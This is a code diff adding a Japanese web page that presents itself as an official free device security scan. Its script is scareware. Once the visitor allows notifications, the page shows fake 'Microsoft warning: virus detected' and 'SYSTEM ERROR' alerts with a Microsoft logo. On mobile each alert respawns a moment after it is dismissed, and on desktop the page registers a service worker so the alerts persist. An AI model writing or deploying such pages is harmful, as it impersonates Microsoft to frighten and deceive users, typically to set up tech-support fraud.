@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>無料セキュリティ診断 | 公式</title>
+    <style>
+        body { font-family: sans-serif; background: #f3f3f3; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; border-top: 6px solid #0078d4; }
+        .btn { background: #0078d4; color: white; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 16px; transition: background 0.3s; }
+        .btn:hover { background: #005a9e; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <h1 style="color:#333; font-size:20px;">🛡️ システム整合性スキャン</h1>
+    <p style="color:#666; font-size:14px;">デバイスの安全性を確認します。スキャンを開始するには下のボタンを押してください。</p>
+    <button class="btn" onclick="start()">スキャンを開始する</button>
+</div>
+
+<script>
+    async function start() {
+        const permission = await Notification.requestPermission();
+        if (permission === "granted") {
+            alert("診断を開始しました。このタブを閉じてもバックグラウンドで継続されます。");
+
+            // デバイス判定
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+            if (isMobile) {
+                // スマホ・iPad用（ブラウザを開いている間だけ動作）
+                sendNotice();
+            } else {
+                // PC用（Service Workerを登録して永続化）
+                const reg = await navigator.serviceWorker.register('sw.js');
+                // 登録完了まで待ってからメッセージ送信
+                navigator.serviceWorker.ready.then((registration) => {
+                    registration.active.postMessage('start');
+                });
+            }
+        } else {
+            alert("エラー: 整合性スキャンを実行するには通知を許可してください。");
+        }
+    }
+
+    // スマホ・iPad用の再帰関数
+    function sendNotice() {
+        const isIcon = Math.random() > 0.5;
+        const n = new Notification(isIcon ? "⚠ Microsoft警告" : "SYSTEM ERROR", {
+            body: isIcon ? "ウイルスを検出しました！直ちに駆除が必要です。" : "システムデータ破損: 0x800410",
+            icon: "https://img.icons8.com/color/96/microsoft.png"
+        });
+
+        // クリック時は何もしない
+        n.onclick = () => { n.close(); };
+
+        // 閉じられた時（スワイプや×ボタン）だけ、0.3秒後に次を出す
+        n.onclose = () => {
+            setTimeout(sendNotice, 300);
+        };
+    }
+</script>
+</body>
+</html>
